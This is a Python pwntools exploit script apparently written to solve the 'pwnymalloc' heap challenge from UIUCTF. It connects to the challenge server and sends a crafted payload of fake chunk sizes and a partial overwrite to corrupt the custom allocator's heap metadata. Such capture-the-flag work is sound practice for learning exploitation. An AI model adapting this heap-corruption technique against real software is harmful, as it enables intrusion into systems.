from pwn import *
import sys

COMPL = 1
REQ = 3
CHECK = 4

_path = "./chal"
exe = ELF(_path)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'pwnymalloc.chal.uiuc.tf'
port = 1337
cmd = '''
    continue
'''

_option = {'run' : process(_path), 
           'exp' : remote(add, port, ssl = True)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

chall = conn()

context.log_level = 'debug'

def _request(_len, _data):
    chall.sendlineafter(b'> ', str(REQ).encode())
    chall.sendlineafter(b'refunded:', str(_len).encode())
    chall.sendlineafter(b'request:', _data)

def _comp(_data):
    chall.sendlineafter(b'> ', str(COMPL).encode())
    chall.sendlineafter(b'complaint:', _data)

def _check(idx):
    chall.sendlineafter(b'> ', str(CHECK).encode())
    chall.sendlineafter(b'ID:', str(idx).encode())

def p(_data):
    return p64(_data, endian = 'little')

def main():
    payload = p(0) * 2 + p(0x50) + p(0) * 8 + p(0x50) + p(0) * 3 + b'\xd0'
    for i in range(int(0xa00 / 0x90) + 5):
        _request(0, payload)
    _comp(b'hehe')
    _comp(b'hehe')
    _comp(b'hehe')
    payload = p(1) * 15
    _request(0, payload)
    _check(3)
    chall.interactive()


if __name__ == "__main__":
    main()

